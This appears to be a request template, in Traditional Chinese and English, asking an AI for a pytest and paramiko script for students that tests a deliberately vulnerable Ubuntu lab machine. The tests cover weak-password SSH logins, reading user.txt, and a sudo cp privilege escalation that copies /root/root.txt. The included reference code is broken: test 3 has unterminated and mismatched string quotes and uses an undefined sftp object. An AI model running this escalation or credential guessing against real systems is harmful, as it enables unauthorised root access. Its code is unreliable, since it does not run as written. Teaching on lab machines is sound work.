請求事項說明
========
> by carlton0521

# 運用構想：

I've prepared a vulnerable Ubuntu that with weak ssh password and cp-privilege vulnerabilities. I need a python test script.

# 擬請AI提供項目

* please provide a python script using pyTest to test following test cases.

## 說明：
* give detail instruction about how to use this script. especially the command to install libraries.

## 測試個案-管理設定
  * connect the ssh service  with  uid/pwd:boxadmin/boxadmin, the result should show that boxadmin is in sudo group.。

## 測試個案-外部滲透
  * connect the ssh service with  uid/pwd:allen/password, the result should show login attempt success.
  * read ~/user.txt, the result should show file access success.。

## 測試個案-內部提權
  * connect the ssh service with  uid/pwd:allen/password, the result should show login attempt success.
  * use sudo-cp-previlege escallation technology to read /root/root.txt , the result should show file access success. 

# 擬請AI作業流程

## When prepare the data:
- assume this file will be named test.py
- Write comment with traditional Chinese.
- In the file beginning, give detail instructions about how to use this file. Also tell user to use pytest -v for detail info.
- Do the work step by step. Make it easy to understand for students.

## When respond the data to me
- just show the action files only. If you need any thing for reminding, put it in the action file in comment style.

# 提供AI參考格式
```
# 使用說明：
# 1. 將此腳本保存為 test_vulnerabilities.py。
# 2. 安裝 Python，作法為：在您的操作系統上安裝合適版本的 Python。
# 3. 安裝 pytest，作法為：在命令行中執行 pip install pytest。
# 4. 安裝 paramiko，作法為：在命令行中執行 pip install paramiko。
# 5. 在終端機中執行 pytest -v test_vulnerabilities.py 進行測試，以獲得詳細信息。

import pytest
import paramiko

# 指定參數
target_ip = "127.0.0.1"  # 請替換成目標主機IP
target_port = 22  # SSH端口

@pytest.fixture(scope="module")
def ssh_client():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    return client

# 測試個案1
def test_ssh_login_as_admin(ssh_client):
    """測試個案-管理設定：以boxadmin登入，檢查是否為sudo組成員。"""
    try:
        ssh_client.connect(target_ip, username='boxadmin', password='boxadmin', port=target_port)
        stdin, stdout, stderr = ssh_client.exec_command('groups')
        groups = stdout.read().decode()
        assert 'sudo' in groups, "boxadmin 應該是 sudo 群組的成員"
    finally:
        ssh_client.close()

# 測試個案2
def test_ssh_login_success_and_read_user_file(ssh_client):
    """測試個案-外部滲透：以正確密碼登入allen並讀取user.txt，預期成功。"""
    try:
        ssh_client.connect(target_ip, username='allen', password='password', port=target_port)
        sftp = ssh_client.open_sftp()
        user_file = sftp.file('/home/allen/user.txt', 'r')
        assert user_file.read(), "應該能夠讀取 /home/allen/user.txt"
    finally:
        ssh_client.close()

# 測試個案3
def test_cp_privilege_escalation(ssh_client):
    """測試個案-內部提權：利用cp-privilege漏洞讀取/root/root.txt。"""
    try:
        ssh_client.connect(target_ip, username='allen', password='password', port=target_port)
        ssh_client.exec_command('sudo cp /root/root.txt /tmp/)
        root_file = sftp.file('/tmp/root.txt, 'r')
        assert root_file.read(), "應該能夠讀取 /root/root.txt"
    finally:
        ssh_client.close()
```